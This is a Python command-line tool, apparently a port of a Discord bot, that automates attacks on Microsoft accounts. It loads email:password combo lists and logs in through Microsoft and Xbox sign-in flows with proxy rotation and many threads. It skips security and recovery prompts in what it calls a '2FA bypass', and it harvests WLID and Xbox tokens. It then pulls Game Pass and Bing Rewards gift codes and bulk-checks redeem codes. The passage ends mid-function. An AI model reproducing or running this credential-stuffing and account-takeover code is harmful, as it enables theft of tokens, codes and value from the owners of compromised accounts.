#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
#  Microsoft AIO Tool
#  made by talkneon
#
#  All-in-one terminal tool ported 1:1 from the JS Discord bot.
#  Includes: Checker, Claimer, Puller, Promo Puller, Inbox AIO,
#  Refund Checker, Rewards, PRS Scraper, Password Changer,
#  Purchaser, Search
# ═══════════════════════════════════════════════════════════════

import requests, os, re, json, time, sys, uuid, hashlib, struct
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from urllib.parse import urlencode, quote, urlparse, parse_qs
from threading import Lock
import random

# ═══════════════════════════════════════════════════════════════
#  CONFIG — edit these
# ═══════════════════════════════════════════════════════════════

THREADS = 10            # default thread count (can override at runtime)
MAX_RETRIES = 3
RETRY_DELAY = 2
RESULTS_DIR = "results"
USE_PROXIES = False
PROXY_FILE = "proxies.txt"

# ═══════════════════════════════════════════════════════════════
#  ANSI COLORS + UI SYSTEM
# ═══════════════════════════════════════════════════════════════

class C:
    RST   = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    # Foreground
    BLK   = "\033[30m"
    RED   = "\033[31m"
    GRN   = "\033[32m"
    YLW   = "\033[33m"
    BLU   = "\033[34m"
    MAG   = "\033[35m"
    CYN   = "\033[36m"
    WHT   = "\033[37m"
    # Bright
    BRED  = "\033[91m"
    BGRN  = "\033[92m"
    BYLW  = "\033[93m"
    BBLU  = "\033[94m"
    BMAG  = "\033[95m"
    BCYN  = "\033[96m"
    BWHT  = "\033[97m"
    # BG
    BGBLK = "\033[40m"
    BGCYN = "\033[46m"
    BGGRN = "\033[42m"
    BGRED = "\033[41m"

lock = Lock()
stop_event = False

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def ensure_dir(d):
    os.makedirs(d, exist_ok=True)

ensure_dir(RESULTS_DIR)

# ── Banner ──

BANNER = f"""{C.BCYN}{C.BOLD}
  ╔══════════════════════════════════════════════════════════╗
  ║                                                          ║
  ║   ███╗   ███╗███████╗    █████╗ ██╗ ██████╗              ║
  ║   ████╗ ████║██╔════╝   ██╔══██╗██║██╔═══██╗             ║
  ║   ██╔████╔██║███████╗   ███████║██║██║   ██║             ║
  ║   ██║╚██╔╝██║╚════██║   ██╔══██║██║██║   ██║             ║
  ║   ██║ ╚═╝ ██║███████║   ██║  ██║██║╚██████╔╝             ║
  ║   ╚═╝     ╚═╝╚══════╝   ╚═╝  ╚═╝╚═╝ ╚═════╝              ║
  ║                                                          ║
  ║   {C.BWHT}Microsoft All-in-One Tool{C.BCYN}          {C.DIM}made by talkneon{C.RST}{C.BCYN}{C.BOLD}   ║
  ╚══════════════════════════════════════════════════════════╝{C.RST}
"""

def line(ch="═", w=60, color=C.DIM):
    print(f"  {color}{ch * w}{C.RST}")

def header(text, color=C.BCYN):
    print(f"\n  {color}{C.BOLD}[ {text} ]{C.RST}")
    line("─", 60, C.DIM)

def info(msg):
    print(f"  {C.CYN}[*]{C.RST} {msg}")

def success(msg):
    print(f"  {C.BGRN}[+]{C.RST} {msg}")

def error(msg):
    print(f"  {C.BRED}[-]{C.RST} {msg}")

def warn(msg):
    print(f"  {C.BYLW}[!]{C.RST} {msg}")

def dim(msg):
    print(f"  {C.DIM}{msg}{C.RST}")

def progress_bar(current, total, width=40, extra=""):
    if total == 0:
        pct = 0
    else:
        pct = current / total
    filled = int(width * pct)
    bar = f"{C.BGRN}{'█' * filled}{C.DIM}{'░' * (width - filled)}{C.RST}"
    pct_str = f"{pct * 100:5.1f}%"
    line_str = f"\r  {C.CYN}[{C.RST}{bar}{C.CYN}]{C.RST} {pct_str} {C.DIM}({current}/{total}){C.RST}"
    if extra:
        line_str += f" {C.DIM}{extra}{C.RST}"
    sys.stdout.write(line_str)
    sys.stdout.flush()

def progress_done():
    print()

# ── Arrow Key Menu ──

def _get_key():
    """Cross-platform single keypress reader."""
    if os.name == "nt":
        import msvcrt
        ch = msvcrt.getch()
        if ch in (b'\xe0', b'\x00'):
            ch2 = msvcrt.getch()
            if ch2 == b'H': return "UP"
            if ch2 == b'P': return "DOWN"
            return None
        if ch == b'\r': return "ENTER"
        if ch == b'\x1b': return "ESC"
        return None
    else:
        import tty, termios
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            ch = sys.stdin.read(1)
            if ch == '\x1b':
                ch2 = sys.stdin.read(1)
                ch3 = sys.stdin.read(1)
                if ch2 == '[':
                    if ch3 == 'A': return "UP"
                    if ch3 == 'B': return "DOWN"
                return "ESC"
            if ch in ('\r', '\n'): return "ENTER"
            if ch == 'q': return "ESC"
            return None
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)

def arrow_menu(options, title="Select an option"):
    """Arrow key navigable menu. Returns index of selected option."""
    selected = 0

    while True:
        clear()
        print(BANNER)
        header(title, C.BCYN)
        print()

        for i, opt in enumerate(options):
            if i == selected:
                print(f"  {C.BCYN}{C.BOLD} > {opt['label']}{C.RST}  {C.DIM}{opt.get('desc', '')}{C.RST}")
            else:
                print(f"  {C.DIM}   {opt['label']}{C.RST}  {C.DIM}{opt.get('desc', '')}{C.RST}")

        print(f"\n  {C.DIM}Use arrow keys to navigate, Enter to select, ESC to quit{C.RST}")

        key = _get_key()
        if key == "UP":
            selected = (selected - 1) % len(options)
        elif key == "DOWN":
            selected = (selected + 1) % len(options)
        elif key == "ENTER":
            return selected
        elif key == "ESC":
            return -1

# ── Input Helpers ──

def auto_detect_file(names):
    """Try to find a file from a list of candidate names."""
    for n in names:
        if os.path.isfile(n):
            return n
    return None

def get_accounts(prompt_name="accounts"):
    """Auto-detect or ask user for accounts file, supports paste."""
    candidates = [f"{prompt_name}.txt", "accounts.txt", "accs.txt", "combos.txt"]
    found = auto_detect_file(candidates)

    if found:
        with open(found, "r", encoding="utf-8", errors="ignore") as f:
            lines = [l.strip() for l in f if l.strip()]
        info(f"Auto-detected: {C.BWHT}{found}{C.RST} ({len(lines)} lines)")
        return lines

    print(f"\n  {C.CYN}[?]{C.RST} Drag & drop a .txt file or paste accounts below")
    print(f"  {C.DIM}    (email:password format, one per line. Empty line to finish){C.RST}\n")

    inp = input(f"  {C.BCYN}>{C.RST} ").strip().strip('"').strip("'")

    if os.path.isfile(inp):
        with open(inp, "r", encoding="utf-8", errors="ignore") as f:
            lines = [l.strip() for l in f if l.strip()]
        info(f"Loaded: {C.BWHT}{inp}{C.RST} ({len(lines)} lines)")
        return lines

    # Paste mode
    lines = [inp] if inp else []
    while True:
        try:
            line_in = input(f"  {C.DIM}>{C.RST} ").strip()
            if not line_in:
                break
            lines.append(line_in)
        except EOFError:
            break

    info(f"Pasted {len(lines)} lines")
    return lines

def get_codes(prompt_name="codes"):
    """Get codes input."""
    candidates = [f"{prompt_name}.txt", "codes.txt"]
    found = auto_detect_file(candidates)

    if found:
        with open(found, "r", encoding="utf-8", errors="ignore") as f:
            lines = [l.strip() for l in f if l.strip()]
        info(f"Auto-detected: {C.BWHT}{found}{C.RST} ({len(lines)} codes)")
        return lines

    print(f"\n  {C.CYN}[?]{C.RST} Drag & drop codes .txt or paste codes below")
    print(f"  {C.DIM}    (one code per line. Empty line to finish){C.RST}\n")

    inp = input(f"  {C.BCYN}>{C.RST} ").strip().strip('"').strip("'")

    if os.path.isfile(inp):
        with open(inp, "r", encoding="utf-8", errors="ignore") as f:
            lines = [l.strip() for l in f if l.strip()]
        info(f"Loaded {len(lines)} codes")
        return lines

    lines = [inp] if inp else []
    while True:
        try:
            line_in = input(f"  {C.DIM}>{C.RST} ").strip()
            if not line_in:
                break
            lines.append(line_in)
        except EOFError:
            break
    return lines

def get_wlids():
    """Get WLID tokens."""
    candidates = ["wlids.txt", "wlid.txt", "tokens.txt"]
    found = auto_detect_file(candidates)

    if found:
        with open(found, "r", encoding="utf-8", errors="ignore") as f:
            lines = [l.strip() for l in f if l.strip()]
        info(f"Auto-detected: {C.BWHT}{found}{C.RST} ({len(lines)} WLIDs)")
        return lines

    print(f"\n  {C.CYN}[?]{C.RST} Drag & drop wlids .txt or paste WLIDs below")
    inp = input(f"  {C.BCYN}>{C.RST} ").strip().strip('"').strip("'")

    if os.path.isfile(inp):
        with open(inp, "r", encoding="utf-8", errors="ignore") as f:
            lines = [l.strip() for l in f if l.strip()]
        return lines

    lines = [inp] if inp else []
    while True:
        try:
            line_in = input(f"  {C.DIM}>{C.RST} ").strip()
            if not line_in:
                break
            lines.append(line_in)
        except EOFError:
            break
    return lines

def ask_threads(default=THREADS):
    """Ask user for thread count with default."""
    try:
        inp = input(f"  {C.CYN}[?]{C.RST} Threads [{C.BWHT}{default}{C.RST}]: ").strip()
        if inp:
            return max(1, min(100, int(inp)))
    except (ValueError, EOFError):
        pass
    return default

def save_results(filename, lines):
    """Save results to file."""
    path = os.path.join(RESULTS_DIR, filename)
    with open(path, "a", encoding="utf-8") as f:
        for l in lines:
            f.write(l + "\n")
    dim(f"Saved {len(lines)} lines to {path}")

def extract_combo(line_str):
    """Extract email:password from potentially dirty input."""
    parts = line_str.strip().split(":")
    if len(parts) >= 2:
        email = parts[0].strip()
        pw = ":".join(parts[1:]).strip()
        if "@" in email:
            return email, pw
    return None, None

def wait_enter():
    input(f"\n  {C.DIM}Press Enter to continue...{C.RST}")

# ═══════════════════════════════════════════════════════════════
#  PROXY SUPPORT
# ═══════════════════════════════════════════════════════════════

_proxies_list = []
_proxy_idx = 0
_proxy_lock = Lock()

def load_proxies():
    global _proxies_list
    if not USE_PROXIES or not os.path.isfile(PROXY_FILE):
        return
    with open(PROXY_FILE, "r") as f:
        _proxies_list = [l.strip() for l in f if l.strip()]
    if _proxies_list:
        info(f"Loaded {len(_proxies_list)} proxies")

def get_proxy():
    global _proxy_idx
    if not _proxies_list:
        return None
    with _proxy_lock:
        p = _proxies_list[_proxy_idx % len(_proxies_list)]
        _proxy_idx += 1
    if "://" not in p:
        p = "http://" + p
    return {"http": p, "https": p}

def do_request(method, url, session=None, **kwargs):
    """Wrapper that optionally uses proxy."""
    s = session or requests.Session()
    kwargs.setdefault("timeout", 30)
    kwargs.setdefault("allow_redirects", True)
    if USE_PROXIES:
        px = get_proxy()
        if px:
            kwargs["proxies"] = px
    return getattr(s, method)(url, **kwargs)

# ═══════════════════════════════════════════════════════════════
#  SHARED AUTH HELPERS (exact match to JS)
# ═══════════════════════════════════════════════════════════════

UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0"

def parse_lr(text, left, right):
    try:
        s = text.index(left) + len(left)
        e = text.index(right, s)
        return text[s:e]
    except (ValueError, IndexError):
        return ""

def extract_ppft(html):
    """Extract PPFT from login page HTML — multiple patterns like JS."""
    patterns = [
        r'name="PPFT"\s+id="i0327"\s+value="([^"]+)"',
        r"sFT:'([^']+)'",
        r'sFTTag:\'([^\']+)\'',
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value=\\"(.+?)\\"',
        r'value="(.+?)"',
    ]
    for p in patterns:
        m = re.search(p, html, re.DOTALL)
        if m:
            val = m.group(1)
            if len(val) > 20:
                return val
    return ""

def extract_urlpost(html):
    """Extract urlPost from login page HTML — multiple patterns like JS."""
    patterns = [
        r"urlPost:'([^']+)'",
        r'urlPost:"([^"]+)"',
        r'"urlPost":"([^"]+)"',
    ]
    for p in patterns:
        m = re.search(p, html, re.DOTALL)
        if m:
            return m.group(1).replace("\\/", "/")
    return ""


class CookieSession:
    """requests.Session wrapper that mirrors JS sessionFetch behavior."""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": UA_STR,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

    def get(self, url, **kwargs):
        kwargs.setdefault("timeout", 30)
        if USE_PROXIES:
            px = get_proxy()
            if px:
                kwargs["proxies"] = px
        return self.session.get(url, **kwargs)

    def post(self, url, **kwargs):
        kwargs.setdefault("timeout", 30)
        if USE_PROXIES:
            px = get_proxy()
            if px:
                kwargs["proxies"] = px
        return self.session.post(url, **kwargs)


# ═══════════════════════════════════════════════════════════════
#  TOOL 1: CODE CHECKER
#  Exact same as JS microsoft-checker.js
# ═══════════════════════════════════════════════════════════════

_title_cache = {}

def check_single_code(code, wlid):
    trimmed = code.strip()
    if not trimmed or len(trimmed) < 18:
        return {"code": trimmed, "status": "invalid"}

    for attempt in range(3):
        try:
            headers = {
                "Authorization": wlid,
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "User-Agent": UA_STR,
                "Origin": "https://www.microsoft.com",
                "Referer": "https://www.microsoft.com/",
            }
            r = do_request("get",
                f"https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/{trimmed}?market=US&language=en-US&supportMultiAvailabilities=true",
                headers=headers, timeout=30)

            if r.status_code == 429:
                time.sleep(5)
                continue

            data = r.json()
            title = "N/A"

            if data.get("products") and len(data["products"]) > 0:
                product = data["products"][0]
                title = (product.get("sku", {}).get("title") or
                         product.get("title") or "N/A")
                if title == "N/A":
                    lp = product.get("localizedProperties", [])
                    if lp:
                        title = lp[0].get("productTitle", "N/A")

            elif data.get("universalStoreBigIds") and len(data["universalStoreBigIds"]) > 0:
                parts = data["universalStoreBigIds"][0].split("/")
                product_id = parts[0]
                sku_id = parts[1] if len(parts) > 1 else ""

                if product_id in _title_cache:
                    title = _title_cache[product_id]
                else:
                    try:
                        cr = do_request("get",
                            f"https://displaycatalog.mp.microsoft.com/v7.0/products?bigIds={product_id}&market=US&languages=en-US",
                            timeout=15)
                        if cr.status_code == 200:
                            cd = cr.json()
                            if cd.get("Products"):
                                p = cd["Products"][0]
                                if p.get("DisplaySkuAvailabilities"):
                                    for s in p["DisplaySkuAvailabilities"]:
                                        if s.get("Sku", {}).get("SkuId") == sku_id:
                                            lp = s["Sku"].get("LocalizedProperties", [])
                                            if lp:
                                                title = lp[0].get("SkuTitle") or lp[0].get("SkuDescription") or title
                                if title == "N/A" and p.get("LocalizedProperties"):
                                    title = p["LocalizedProperties"][0].get("ProductTitle", "N/A")
                                if title != "N/A":
                                    _title_cache[product_id] = title
                    except Exception:
                        title = f"ID: {product_id}"

            clean_title = (title or "N/A").strip()

            state = data.get("tokenState", "")
            code_field = data.get("code", "")

            if state == "Active":
                return {"code": trimmed, "status": "valid", "title": clean_title}
            if state == "Redeemed":
                return {"code": trimmed, "status": "used", "title": clean_title}
            if state == "Expired":
                return {"code": trimmed, "status": "expired", "title": clean_title}
            if code_field == "NotFound":
                return {"code": trimmed, "status": "invalid"}
            if code_field == "Unauthorized":
                return {"code": trimmed, "status": "error", "error": "WLID unauthorized"}
            return {"code": trimmed, "status": "invalid"}

        except Exception as e:
            if attempt >= 2:
                return {"code": trimmed, "status": "error", "error": str(e)[:100]}
            time.sleep(1)

    return {"code": trimmed, "status": "error", "error": "Max retries"}

def run_checker():
    header("CODE CHECKER", C.BGRN)

    wlids = get_wlids()
    if not wlids:
        error("No WLIDs provided")
        wait_enter()
        return

    codes = get_codes()
    if not codes:
        error("No codes provided")
        wait_enter()
        return

    threads = ask_threads()

    formatted = []
    for w in wlids:
        if "WLID1.0=" in w:
            formatted.append(w.strip())
        else:
            formatted.append(f'WLID1.0="{w.strip()}"')

    MAX_PER_WLID = 40
    tasks = []
    for i, code in enumerate(codes):
        c = code.strip()
        if not c:
            continue
        wlid_idx = i // MAX_PER_WLID
        if wlid_idx >= len(formatted):
            break
        tasks.append((c, formatted[wlid_idx]))

    info(f"Checking {len(tasks)} codes with {len(formatted)} WLIDs using {threads} threads")
    print()

    results = {"valid": [], "used": [], "expired": [], "invalid": [], "error": []}
    done = [0]

    def worker(task):
        code, wlid = task
        r = check_single_code(code, wlid)
        with lock:
            done[0] += 1
            status = r.get("status", "invalid")
            if status in results:
                display = r.get("title", "")
                if display and display != "N/A":
                    results[status].append(f"{r['code']} | {display}")
                else:
                    results[status].append(r["code"])
            else:
                results["invalid"].append(r["code"])
            progress_bar(done[0], len(tasks))
        return r

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(worker, tasks))

    progress_done()
    print()

    header("RESULTS", C.BCYN)
    success(f"Valid:   {C.BGRN}{len(results['valid'])}{C.RST}")
    error(f"Used:    {C.BRED}{len(results['used'])}{C.RST}")
    warn(f"Expired: {C.BYLW}{len(results['expired'])}{C.RST}")
    dim(f"  Invalid: {len(results['invalid'])}")
    dim(f"  Errors:  {len(results['error'])}")
    print()

    if results["valid"]:
        save_results("valid_codes.txt", results["valid"])
    if results["used"]:
        save_results("used_codes.txt", results["used"])
    if results["expired"]:
        save_results("expired_codes.txt", results["expired"])

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  TOOL 2: WLID CLAIMER
#  Exact same login flow as JS microsoft-claimer.js
# ═══════════════════════════════════════════════════════════════

def authenticate_account(email, password):
    """Authenticate via billing/redeem flow and extract WLID token."""
    s = CookieSession()

    try:
        # Step 1: Load redeem page (triggers redirect chain to AAD)
        r = s.get("https://account.microsoft.com/billing/redeem")
        html = r.text

        # Step 2: Extract PPFT + urlPost
        ppft = extract_ppft(html)
        url_post = extract_urlpost(html)

        if not ppft or not url_post:
            return {"email": email, "success": False, "error": "PPFT/urlPost not found"}

        # Step 3: Submit credentials
        post_data = {
            "i13": "1", "login": email, "loginfmt": email,
            "type": "11", "LoginOptions": "1", "passwd": password,
            "ps": "2", "PPFT": ppft, "PPSX": "PassportR",
            "NewUser": "1", "FoundMSAs": "", "fspost": "0",
            "i21": "0", "CookieDisclosure": "0",
            "IsFidoSupported": "0", "isSignupPost": "0",
        }

        r2 = s.post(url_post, data=post_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": r.url,
        })
        html2 = r2.text

        # Check for second-stage sFT
        sft2 = ""
        m = re.search(r"sFT:'([^']+)'", html2)
        if m:
            sft2 = m.group(1)
        if not m:
            m = re.search(r'"sFTTag":"[^"]*value=\\"([^"\\]+)\\"', html2)
            if m:
                sft2 = m.group(1)

        url_post2 = extract_urlpost(html2)
        if sft2 and url_post2:
            post_data2 = {
                "LoginOptions": "3", "type": "28",
                "ctx": "", "hpgrequestid": "",
                "PPFT": sft2, "i19": "19130",
            }
            r3 = s.post(url_post2, data=post_data2, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
            })

        # Handle privacy notice / fmHF forms
        for _ in range(3):
            cur_text = s.session.get("https://account.microsoft.com/", timeout=15).text if False else ""
            break

        # Step 4: Extract token
        try:
            tr = s.get("https://account.microsoft.com/auth/acquire-onbehalf-of-token?scopes=MSComServiceMBISSL",
                       headers={
                           "Accept": "application/json",
                           "X-Requested-With": "XMLHttpRequest",
                           "Referer": "https://account.microsoft.com/billing/redeem",
                       })
            if tr.status_code == 200:
                data = tr.json()
                if isinstance(data, list) and data and data[0].get("token"):
                    return {"email": email, "success": True, "token": data[0]["token"]}
                if isinstance(data, dict) and data.get("token"):
                    return {"email": email, "success": True, "token": data["token"]}
        except Exception:
            pass

        return {"email": email, "success": False, "error": "Token extraction failed"}

    except Exception as e:
        return {"email": email, "success": False, "error": str(e)[:100]}

def run_claimer():
    header("WLID CLAIMER", C.BMAG)

    accounts = get_accounts()
    if not accounts:
        error("No accounts provided")
        wait_enter()
        return

    threads = ask_threads(5)
    parsed = []
    for a in accounts:
        e, p = extract_combo(a)
        if e and p:
            parsed.append((e, p))

    if not parsed:
        error("No valid email:password combos found")
        wait_enter()
        return

    info(f"Processing {len(parsed)} accounts with {threads} threads")
    print()

    successes = []
    failures = []
    done = [0]

    def worker(args):
        email, pw = args
        r = authenticate_account(email, pw)
        with lock:
            done[0] += 1
            if r["success"]:
                successes.append(r["token"])
            else:
                failures.append(f"{email}: {r.get('error', 'Unknown')}")
            progress_bar(done[0], len(parsed))
        return r

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(worker, parsed))

    progress_done()
    print()

    header("RESULTS", C.BCYN)
    success(f"Success: {C.BGRN}{len(successes)}{C.RST}")
    error(f"Failed:  {C.BRED}{len(failures)}{C.RST}")

    if successes:
        save_results("valid_wlid.txt", successes)
    if failures:
        save_results("failed_wlid.txt", failures)

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  TOOL 3: PULLER (Game Pass + PRS Phase 2 + WLID Validation)
#  Exact same flow as JS microsoft-puller.js
# ═══════════════════════════════════════════════════════════════

MICROSOFT_OAUTH_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

INVALID_CHARS = set("AEIOUL S015")

def is_invalid_code_format(code):
    if not code or len(code) < 5 or " " in code:
        return True
    for ch in code:
        if ch in INVALID_CHARS:
            return True
    return False

def fetch_oauth_tokens(session):
    try:
        r = session.get(MICROSOFT_OAUTH_URL)
        html = r.text
        ppft = extract_ppft(html)
        url_post = extract_urlpost(html)
        return url_post, ppft
    except Exception:
        return None, None

def fetch_login(session, email, password, url_post, ppft):
    try:
        data = {"login": email, "loginfmt": email, "passwd": password, "PPFT": ppft}
        r = session.post(url_post, data=data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
        })

        # Check URL fragment for access_token
        if "#" in r.url:
            from urllib.parse import urlparse, parse_qs
            frag = urlparse(r.url).fragment
            params = parse_qs(frag)
            token = params.get("access_token", [None])[0]
            if token and token != "None":
                return token

        html = r.text

        # Handle cancel/2FA bypass
        if "cancel?mkt=" in html:
            ipt = re.search(r'"ipt" value="(.+?)"', html)
            pprid = re.search(r'"pprid" value="(.+?)"', html)
            uaid_m = re.search(r'"uaid" value="(.+?)"', html)
            action = re.search(r'id="fmHF" action="(.+?)"', html)

            if ipt and pprid and uaid_m and action:
                form_data = {"ipt": ipt.group(1), "pprid": pprid.group(1), "uaid": uaid_m.group(1)}
                r2 = session.post(action.group(1), data=form_data, headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                })
                ret_url = re.search(r'"recoveryCancel":\{"returnUrl":"(.+?)"', r2.text)
                if ret_url:
                    r3 = session.get(ret_url.group(1))
                    if "#" in r3.url:
                        frag = urlparse(r3.url).fragment
                        params = parse_qs(frag)
                        token = params.get("access_token", [None])[0]
                        if token and token != "None":
                            return token
        return None
    except Exception:
        return None

def get_xbox_tokens(rps_token):
    try:
        r1 = requests.post("https://user.auth.xboxlive.com/user/authenticate",
            json={"RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT",
                  "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": rps_token}},
            headers={"Content-Type": "application/json"}, timeout=15)
        if r1.status_code != 200:
            return None, None
        user_token = r1.json()["Token"]

        r2 = requests.post("https://xsts.auth.xboxlive.com/xsts/authorize",
            json={"RelyingParty": "http://xboxlive.com", "TokenType": "JWT",
                  "Properties": {"UserTokens": [user_token], "SandboxId": "RETAIL"}},
            headers={"Content-Type": "application/json"}, timeout=15)
        if r2.status_code != 200:
            return None, None
        xsts_data = r2.json()
        uhs = xsts_data.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs")
        return uhs, xsts_data["Token"]
    except Exception:
        return None, None

def fetch_codes_from_xbox(uhs, xsts_token):
    try:
        auth = f"XBL3.0 x={uhs};{xsts_token}"
        r = requests.get("https://profile.gamepass.com/v2/offers",
            headers={"Authorization": auth, "Content-Type": "application/json", "User-Agent": "okhttp/4.12.0"},
            timeout=15)
        if r.status_code != 200:
            return [], []

        data = r.json()
        codes, links = [], []
        for offer in data.get("offers", []):
            resource = offer.get("resource", "")
            if resource:
                if resource.startswith("http"):
                    links.append(resource)
                else:
                    codes.append(resource)
            elif offer.get("offerStatus") == "available":
                chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
                cv = "".join(random.choice(chars) for _ in range(22)) + ".0"
                try:
                    cr = requests.post(f"https://profile.gamepass.com/v2/offers/{offer['offerId']}",
                        headers={"Authorization": auth, "Content-Type": "application/json",
                                 "User-Agent": "okhttp/4.12.0", "ms-cv": cv, "Content-Length": "0"},
                        data="", timeout=15)
                    if cr.status_code == 200:
                        cd = cr.json()
                        res = cd.get("resource", "")
                        if res:
                            if res.startswith("http"):
                                links.append(res)
                            else:
                                codes.append(res)
                except Exception:
                    pass
        return codes, links
    except Exception:
        return [], []

def fetch_from_account(email, password):
    s = CookieSession()
    try:
        url_post, ppft = fetch_oauth_tokens(s)
        if not url_post:
            return {"email": email, "codes": [], "links": [], "error": "OAuth failed"}
        rps = fetch_login(s, email, password, url_post, ppft)
        if not rps:
            return {"email": email, "codes": [], "links": [], "error": "Login failed"}
        uhs, xsts = get_xbox_tokens(rps)
        if not uhs:
            return {"email": email, "codes": [], "links": [], "error": "Xbox tokens failed"}
        codes, links = fetch_codes_from_xbox(uhs, xsts)
        return {"email": email, "codes": codes, "links": links}
    except Exception as e:
        return {"email": email, "codes": [], "links": [], "error": str(e)[:100]}


# ── PRS (Rewards Scraper) for Phase 2 ──

EXCLUDE_WORDS = {
    "SWEEPSTAKES", "STATUS", "WINORDER", "CONTEST", "PLAGUE", "REQUIEM",
    "CUSTOM", "BUNDLEORDER", "SURFACE", "PROORDER", "SERIES", "POINTS",
    "DONATION", "CHILDREN", "RESEARCH", "MICROSOFT", "DIGITAL", "ORDER",
    "CODE", "FOUND", "REDEMPTION", "REDEEM", "DOWNLOAD", "GIFT", "CARD",
    "LEAGUE", "LEGENDS", "OVERWATCH", "GAME", "PASS", "MINECOINS", "ROBUX",
}

CODE_PATTERNS = [
    re.compile(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'),
    re.compile(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'),
    re.compile(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'),
]

def extract_codes_from_text(text):
    codes = []
    upper = text.upper()
    for pat in CODE_PATTERNS:
        for m in pat.finditer(upper):
            code = m.group(0)
            if "*" in code:
                continue
            if code in EXCLUDE_WORDS:
                continue
            alnum = len(code.replace("-", ""))
            if alnum < 12:
                continue
            parts = code.split("-")
            if len(parts) < 3:
                continue
            if code not in codes:
                codes.append(code)
    return codes

def prs_scrape_single(email, password):
    """Scrape rewards.bing.com/redeem/orderhistory for codes."""
    s = CookieSession()
    codes_found = []

    try:
        # Login via Xbox OAuth
        url_post, ppft = fetch_oauth_tokens(s)
        if not url_post or not ppft:
            return codes_found

        data = {"login": email, "loginfmt": email, "passwd": password, "PPFT": ppft}
        r = s.post(url_post, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})

        # Handle cancel/2FA forms
        html = r.text
        if "cancel?mkt=" in html:
            ipt = re.search(r'"ipt" value="(.+?)"', html)
            pprid = re.search(r'"pprid" value="(.+?)"', html)
            uaid_m = re.search(r'"uaid" value="(.+?)"', html)
            action = re.search(r'id="fmHF" action="(.+?)"', html)
            if ipt and pprid and uaid_m and action:
                form_data = {"ipt": ipt.group(1), "pprid": pprid.group(1), "uaid": uaid_m.group(1)}
                r2 = s.post(action.group(1), data=form_data, headers={"Content-Type": "application/x-www-form-urlencoded"})
                ret_url = re.search(r'"recoveryCancel":\{"returnUrl":"(.+?)"', r2.text)
                if ret_url:
                    s.get(ret_url.group(1))

        # Navigate to order history
        rh = s.get("https://rewards.bing.com/redeem/orderhistory",
                    headers={"Referer": "https://rewards.bing.com/"})
        text = rh.text

        # Handle fmHF auto-submit forms
        if "fmHF" in text or "JavaScript required" in text:
            action_m = re.search(r'<form[^>]*(?:id="fmHF"|name="fmHF")[^>]*action="([^"]+)"', text)
            if action_m:
                action_url = action_m.group(1)
                if action_url.startswith("/"):
                    action_url = "https://login.live.com" + action_url
                inputs = re.findall(r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"[^>]*>', text)
                form_data = {n: v for n, v in inputs}
                s.post(action_url, data=form_data, headers={"Content-Type": "application/x-www-form-urlencoded"})
                rh = s.get("https://rewards.bing.com/redeem/orderhistory",
                           headers={"Referer": "https://rewards.bing.com/"})
                text = rh.text

        # Extract verification token
        vt_m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]*)"', text)
        vt = vt_m.group(1) if vt_m else ""

        # Parse table rows for "Get Code" buttons
        tr_pattern = re.compile(r'<tr[^>]*>([\s\S]*?)</tr>', re.IGNORECASE)
        for tr_match in tr_pattern.finditer(text):
            row_html = tr_match.group(0)
            get_code_m = re.search(r'id="OrderDetails_[^"]*"[^>]*data-actionurl="([^"]*)"', row_html)

            if get_code_m:
                action_url = get_code_m.group(1).replace("&amp;", "&")
                if action_url.startswith("/"):
                    action_url = "https://rewards.bing.com" + action_url

                try:
                    post_data = {}
                    if vt:
                        post_data["__RequestVerificationToken"] = vt
                    cr = s.post(action_url, data=post_data, headers={
                        "X-Requested-With": "XMLHttpRequest",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    })
                    code_html = cr.text

                    # Extract code from various patterns
                    code = None

                    # Tango credential divs
                    keys = re.findall(r"class=['\"]tango-credential-key['\"][^>]*>([\s\S]*?)</div>", code_html, re.IGNORECASE)
                    vals = re.findall(r"class=['\"]tango-credential-value['\"][^>]*>([\s\S]*?)</div>", code_html, re.IGNORECASE)
                    for i, k in enumerate(keys):
                        k_clean = re.sub(r'<[^>]*>', '', k).upper()
                        if ("CODE" in k_clean or "PIN" in k_clean) and i < len(vals):
                            v_clean = re.sub(r'<[^>]*>', '', vals[i]).strip()
                            if v_clean and "*" not in v_clean:
